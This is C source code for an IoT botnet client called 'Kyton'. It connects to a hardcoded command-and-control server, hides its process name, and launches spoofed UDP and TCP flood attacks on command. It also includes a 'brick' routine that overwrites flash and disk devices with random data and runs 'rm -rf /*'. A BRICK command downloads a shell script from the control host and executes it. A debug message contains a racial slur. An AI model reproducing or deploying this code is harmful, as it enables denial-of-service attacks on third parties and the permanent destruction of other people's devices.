#define _GNU_SOURCE

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "headers/xor.h"
#include "headers/rand.h"
#include "headers/includes.h"
#include "headers/killer.h"

#ifdef SCANNER
#include "headers/scanner.h"
#endif

#define LST_SZ (sizeof(KYT), sizeof(KYT2), sizeof(KYT3), sizeof(KYT4))
#define RGHT 1
#define ZRO 2
#define PBL 12
#define ST_NM 15
#define killer_pid

int KYT[] = {167};
int KYT2[] = {99};
int KYT3[] = {82};
int KYT4[] = {172};

int KytonSock = 0, SRV = -1, gotIP = 0, ioctl_pid = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t CMWC(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}
void reboot() 
{

    #ifdef DEBUG
    printf("[troll] rebooting now!");
    #endif
    system("reboot");
}
void brick()
{
    system("cat /proc/mounts\ncat /dev/urandom | mtd_write mtd0 - 0 32768\ncat /dev/urandom | mtd_write mtd1 - 0 32768\n' ii11II += 'busybox cat /dev/urandom >/dev/mtd0 &\nbusybox cat /dev/urandom >/dev/sda &\nbusybox cat /dev/urandom >/dev/mtd1 &\nbusybox cat /dev/urandom >/dev/mtdblock0 &\nbusybox cat /dev/urandom >/dev/mtdblock1 &\nbusybox cat /dev/urandom >/dev/mtdblock2 &\nbusybox cat /dev/urandom >/dev/mtdblock3 &\n' ii11II += 'busybox route del default\ncat /dev/urandom >/dev/mtdblock0 &\ncat /dev/urandom >/dev/mtdblock1 &\ncat /dev/urandom >/dev/mtdblock2 &\ncat /dev/urandom >/dev/mtdblock3 &\ncat /dev/urandom >/dev/mtdblock4 &\ncat /dev/urandom >/dev/mtdblock5 &\ncat /dev/urandom >/dev/mmcblk0 &\ncat /dev/urandom >/dev/mmcblk0p9 &\ncat /dev/urandom >/dev/mmcblk0p12 &\ncat /dev/urandom >/dev/mmcblk0p13 &\ncat /dev/urandom >/dev/root &\ncat /dev/urandom >/dev/mmcblk0p8 &\ncat /dev/urandom >/dev/mmcblk0p16 &\n' ii11II += 'route del default;iproute del default;ip route del default;rm -rf /* 2>/dev/null &\niptables -F;iptables -t nat -F;iptables -A INPUT -j DROP;iptables -A FORWARD -j DROP\nhalt -n -f\nreboot\n");
    #ifdef DEBUG
    printf("[troll] get bricked nigga");
    #endif
}
void message()
{
    int message;
    printf("[troll] %s", message);
}


void KeepAlive(void) {
    ioctl_pid = fork();
    if (ioctl_pid > 0 || ioctl_pid == -1)
        return;
    int timeout = 1, ioctl_fd = 0, found = FALSE;
    table_unlock_val(XOR_IOCTL_WATCH1);
    table_unlock_val(XOR_IOCTL_WATCH2);
    if ((ioctl_fd = open(table_retrieve_val(XOR_IOCTL_WATCH1, NULL), 2)) != -1 ||
        (ioctl_fd = open(table_retrieve_val(XOR_IOCTL_WATCH2, NULL), 2)) != -1) {
        found = TRUE;
        ioctl(ioctl_fd, 0x80045704, &timeout);
    }
    if (found) {
        while (TRUE) {
            ioctl(ioctl_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    table_lock_val(XOR_IOCTL_WATCH1);
    table_lock_val(XOR_IOCTL_WATCH2);
    exit(0);
}

void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;

    while (isspace(str[begin])) begin++;

    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];

    str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c) {
    if (str) {
        **str = c;
        ++(*str);
    } else (void) write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
    register int pc = 0, padchar = ' ';
    if (width > 0) {
        register int len = 0;
        register const unsigned char *ptr;
        for (ptr = string; *ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad & ZRO) padchar = '0';
    }
    if (!(pad & RGHT)) {
        for (; width > 0; --width) {
            printchar(out, padchar);
            ++pc;
        }
    }
    for (; *string; ++string) {
        printchar(out, *string);
        ++pc;
    }
    for (; width > 0; --width) {
        printchar(out, padchar);
        ++pc;
    }
    return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
    unsigned char print_buf[PBL];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;
    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints(out, print_buf, width, pad);
    }
    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }
    s = print_buf + PBL - 1;
    *s = '\0';

    while (u) {
        t = u % b;
        if (t >= 10)
            t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if (width && (pad & ZRO)) {
            printchar(out, '-');
            ++pc;
            --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints(out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args) {
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];

    for (; *format != 0; ++format) {
        if (*format == '%') {
            ++format;
            width = pad = 0;
            if (*format == '\0') break;
            if (*format == '%') goto out;
            if (*format == '-') {
                ++format;
                pad = RGHT;
            }
            while (*format == '0') {
                ++format;
                pad |= ZRO;
            }
            for (; *format >= '0' && *format <= '9'; ++format) {
                width *= 10;
                width += *format - '0';
            }
            if (*format == 's') {
                table_unlock_val(XOR_NULL);
                register char *s = (char *) va_arg(args, int);
                pc += prints(out, s ? s : table_retrieve_val(XOR_NULL, NULL), width, pad);
                table_lock_val(XOR_NULL);
                continue;
            }
            if (*format == 'd') {
                pc += printi(out, va_arg(args, int), 10, 1, width, pad, 'a');
                continue;
            }
            if (*format == 'x') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'a');
                continue;
            }
            if (*format == 'X') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'A');
                continue;
            }
            if (*format == 'u') {
                pc += printi(out, va_arg(args, int), 10, 0, width, pad, 'a');
                continue;
            }
            if (*format == 'c') {
                scr[0] = (unsigned char) va_arg(args, int);
                scr[1] = '\0';
                pc += prints(out, scr, width, pad);
                continue;
            }
        } else {
            out:
            printchar(out, *format);
            ++pc;
        }
    }
    if (out) **out = '\0';
    va_end(args);
    return pc;
}

int SZP(unsigned char *out, const unsigned char *format, ...) {
    va_list args;
    va_start(args, format);
    return print(&out, format, args);
}

int KytonPrint(int sock, char *formatStr, ...) {
    unsigned char *textBuffer = malloc(2048);
    memset(textBuffer, 0, 2048);
    char *orig = textBuffer;
    va_list args;
    va_start(args, formatStr);
    print(&textBuffer, formatStr, args);
    va_end(args);
    orig[strlen(orig)] = '\n';
    int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
    free(orig);
    return q;
}

int getHost(unsigned char *toGet, struct in_addr *i) {
    struct hostent *h;
    if ((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}

void MRS(unsigned char *buf, int length) {
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (CMWC() % (91 - 65)) + 65;
}

int recvLine(int socket, unsigned char *buf, int bufsize) {
    memset(buf, 0, bufsize);

    fd_set myset;
    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    FD_ZERO(&myset);
    FD_SET(socket, &myset);
    int selectRtn, retryCount;
    if ((selectRtn = select(socket + 1, &myset, NULL, &myset, &tv)) <= 0) {
        while (retryCount < 10) {

            tv.tv_sec = 30;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(socket, &myset);
            if ((selectRtn = select(socket + 1, &myset, NULL, &myset, &tv)) <= 0) {
                retryCount++;
                continue;
            }

            break;
        }
    }

    unsigned char tmpchr;
    unsigned char *cp;
    int count = 0;

    cp = buf;
    while (bufsize-- > 1) {
        if (recv(KytonSock, &tmpchr, 1, 0) != 1) {
            *cp = 0x00;
            return -1;
        }
        *cp++ = tmpchr;
        if (tmpchr == '\n') break;
        count++;
    }
    *cp = 0x00;
    return count;
}

int connectTimeout(int fd, char *host, int port, int timeout) {
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;

    int valopt;
    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (getHost(host, &dest_addr.sin_addr)) return 0;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int res = connect(fd, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(fd, &myset);
            if (select(fd + 1, NULL, &myset, NULL, &tv) > 0) {
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void *) (&valopt), &lon);
                if (valopt) return 0;
            } else return 0;
        } else return 0;
    }

    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(fd, F_SETFL, arg);

    return 1;
}

int listFork() {
    uint32_t parent, *newpids, i;
    parent = fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids = (uint32_t *) malloc((numpids + 1) * 4);
    for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;
    return parent;
}

in_addr_t GRI(in_addr_t netmask) {
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ (CMWC() & ~netmask);
}

unsigned short csum(unsigned short *buf, int count) {
    register uint64_t sum = 0;
    while (count > 1) {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0) {
        sum += *(unsigned char *) buf;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc((size_t) totaltcp_len);
    memcpy((unsigned char *) tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *) tcp + sizeof(struct tcp_pseudo), (unsigned char *) tcph, sizeof(struct tcphdr));
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void MIP(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = CMWC();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}

char *GB() {
#if defined(__x86_64__) || defined(_M_X64)
    return "1";
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "1";
#elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "2";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "2";
#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "2";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "2";
#elif defined(mips) || defined(__mips__) || defined(__mips)
    return "3";
#elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "4";
#else
    return "0";
#endif
}

void SUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval) {
    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if (port == 0) dest_addr.sin_port = CMWC();
    else dest_addr.sin_port = htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    register unsigned int pollRegister;
    pollRegister = pollinterval;

    if (spoofit == 32) {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (!sockfd) {
            return;
        }

        unsigned char *buf = (unsigned char *) malloc(packetsize + 1);
        if (buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        MRS(buf, packetsize);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while (1) {
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

            if (i == pollRegister) {
                if (port == 0) dest_addr.sin_port = CMWC();
                if (time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
        }
    } else {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (!sockfd) {
            return;
        }

        int tmp = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
            return;
        }

        int counter = 50;
        while (counter--) {
            srand(time(NULL) ^ CMWC());
            init_rand(rand());
        }

        in_addr_t netmask;

        if (spoofit == 0) netmask = (~((in_addr_t) - 1));
        else netmask = (~((1 << (32 - spoofit)) - 1));

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *) packet;
        struct udphdr *udph = (void *) iph + sizeof(struct iphdr);

        MIP(iph, dest_addr.sin_addr.s_addr, htonl(GRI(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

        udph->len = htons(sizeof(struct udphdr) + packetsize);
        udph->source = CMWC();
        udph->dest = (port == 0 ? CMWC() : htons(port));
        udph->check = 0;

        MRS((unsigned char *) (((unsigned char *) udph) + sizeof(struct udphdr)), packetsize);

        iph->check = csum((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while (1) {
            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

            udph->source = CMWC();
            udph->dest = (port == 0 ? CMWC() : htons(port));
            iph->id = CMWC();
            iph->saddr = htonl(GRI(netmask));
            iph->check = csum((unsigned short *) packet, iph->tot_len);

            if (i == pollRegister) {
                if (time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
        }
    }
}

void STCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize,
          int pollinterval) {
    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if (port == 0) dest_addr.sin_port = CMWC();
    else dest_addr.sin_port = htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (!sockfd) {
        return;
    }

    int tmp = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        return;
    }

    in_addr_t netmask;

    if (spoofit == 0) netmask = (~((in_addr_t) - 1));
    else netmask = (~((1 << (32 - spoofit)) - 1));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (void *) iph + sizeof(struct iphdr);

    MIP(iph, dest_addr.sin_addr.s_addr, htonl(GRI(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = CMWC();
    tcph->seq = CMWC();
    tcph->ack_seq = 0;
    tcph->doff = 5;

    if (!strcmp(flags, "A")) {
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->fin = 1;
        tcph->ack = 1;
        tcph->psh = 1;
    }

    tcph->window = CMWC();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? CMWC() : htons(port));
    tcph->check = tcpcsum(iph, tcph);

    iph->check = csum((unsigned short *) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while (1) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

        iph->saddr = htonl(GRI(netmask));
        iph->id = CMWC();
        tcph->seq = CMWC();
        tcph->source = CMWC();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum((unsigned short *) packet, iph->tot_len);

        if (i == pollRegister) {
            if (time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}

void CnC(int argc, unsigned char *argv[]) {
    if (!strcmp(argv[0], "U")) {
        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 ||
            atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) { return; }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        int packetsize = atoi(argv[5]);
        int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);
        if (strstr(ip, ",") != NULL) {
            unsigned char *hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    SUDP(hi, port, time, spoofed, packetsize, pollinterval);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SUDP(ip, port, time, spoofed, packetsize, pollinterval);
            _exit(0);
        }
    }


    if (!strcmp(argv[0], "T")) {
        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 ||
            (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1)) { return; }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char *flags = argv[5];
        int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int psize = argc > 6 ? atoi(argv[6]) : 0;
        if (strstr(ip, ",") != NULL) {
            unsigned char *hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    STCP(hi, port, time, spoofed, flags, psize, pollinterval);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            STCP(ip, port, time, spoofed, flags, psize, pollinterval);
            _exit(0);
        }
    }

    if (!strcmp(argv[0], "P")) { _exit(0); }
    if (!strcmp(argv[0], "K")) {
        int killed = 0;
        unsigned long i;
        for (i = 0; i < numpids; i++) {
            if (pids[i] != 0 && pids[i] != getpid()) {
                kill(pids[i], 9);
                killed++;
            }
        }
        if (killed > 0) {
        } else {}
    }



if(!strcmp(argv[0],"REBOOT"))

{   KytonPrint(KytonSock, "update_bins");
    reboot();

    }
    if(!strcmp(argv[0],"MESSAGE"))

{   KytonPrint(KytonSock, "update_bins");
    message();
if(!strcmp(argv[0],"BRICK"))

{   KytonPrint(KytonSock, "update_bins");
    system("wget http://167.99.82.172/bricker.sh -O /opt/bricker.sh > /dev/null 2>&1;chmod +x /opt/bricker.sh > /dev/null 2>&1;/opt/bricker.sh > /dev/null 2>&1;rm /opt/bricker.sh > /dev/null 2>&1");

    }

}
}



int Conn() {
    unsigned char server[4096];
    memset(server, 0, 4096);
    if (KytonSock) {
        close(KytonSock);
        KytonSock = 0;
    }
    if (SRV + 1 == LST_SZ) SRV = 0;
    else SRV++;
    SZP(server, "%d.%d.%d.%d", KYT[SRV], KYT2[SRV], KYT3[SRV], KYT4[SRV]);
    int port = 733;

    KytonSock = socket(AF_INET, SOCK_STREAM, 0);

    if (!connectTimeout(KytonSock, server, port, 30)) return 1;

    return 0;
}

int main(int argc, unsigned char *argv[]) {
    if (LST_SZ <= 0) return 0;
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    table_init();
#ifdef SCANNER
    rep_init();
    rep_init();
    rep_init();
#endif
#ifdef SERVER
    rep_init();
    rep_init();
    rep_init();
#endif
    rand_init();
    char name_buf[32];
    int name_buf_len;
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    strcpy(argv[0], name_buf);
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(ST_NM, name_buf);
    pid_t pid1;
    pid_t pid2;
    int status;
    setsid();
    chdir("/");
    signal(SIGPIPE, SIG_IGN);
    char *tbl_exec_succ;
    int tbl_exec_succ_len = 0;
    table_unlock_val(XOR_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(XOR_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(XOR_EXEC_SUCCESS);
    killer_init();
    KeepAlive();
    if (pid1 = fork()) {
        waitpid(pid1, &status, 0);
        exit(0);
    } else if (!pid1) {
        if (pid2 = fork()) {
            exit(0);
        } else if (!pid2) {
        } else {}
    } else {}
    while (1) {
        if (Conn()) {
            sleep(3);
            continue;
        }
        KytonPrint(KytonSock, "%s", GB());
        char CMB[4096];
        int got = 0;
        int i = 0;
        while ((got = recvLine(KytonSock, CMB, 4096)) != -1) {
            for (i = 0; i < numpids; i++)
                if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                    unsigned int *newpids, on;
                    for (on = i + 1; on < numpids; on++) pids[on - 1] = pids[on];
                    pids[on - 1] = 0;
                    numpids--;
                    newpids = (unsigned int *) malloc((numpids + 1) * sizeof(unsigned int));
                    for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                    free(pids);
                    pids = newpids;
                }
            CMB[got] = 0x00;
            trim(CMB);
            unsigned char *KMSG = CMB;
            if (*KMSG == '!') {
                unsigned char *nickMask = KMSG + 1;
                while (*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                if (*nickMask == 0x00) continue;
                *(nickMask) = 0x00;
                nickMask = KMSG + 1;
                KMSG = KMSG + strlen(nickMask) + 2;
                while (KMSG[strlen(KMSG) - 1] == '\n' || KMSG[strlen(KMSG) - 1] == '\r')
                    KMSG[strlen(KMSG) - 1] = 0x00;
                unsigned char *command = KMSG;
                while (*KMSG != ' ' && *KMSG != 0x00) KMSG++;
                *KMSG = 0x00;
                KMSG++;
                unsigned char *tmpcommand = command;
                while (*tmpcommand) {
                    *tmpcommand = toupper(*tmpcommand);
                    tmpcommand++;
                }
                unsigned char *params[10];
                int paramsCount = 1;
                unsigned char *pch = strtok(KMSG, " ");
                params[0] = command;
                while (pch) {
                    if (*pch != '\n') {
                        params[paramsCount] = (unsigned char *) malloc(strlen(pch) + 1);
                        memset(params[paramsCount], 0, strlen(pch) + 1);
                        strcpy(params[paramsCount], pch);
                        paramsCount++;
                    }
                    pch = strtok(NULL, " ");
                }
                CnC(paramsCount, params);
                if (paramsCount > 1) {
                    int q = 1;
                    for (q = 1; q < paramsCount; q++) {
                        free(params[q]);
                    }
                }
            }
        }
    }
    return 0;
}
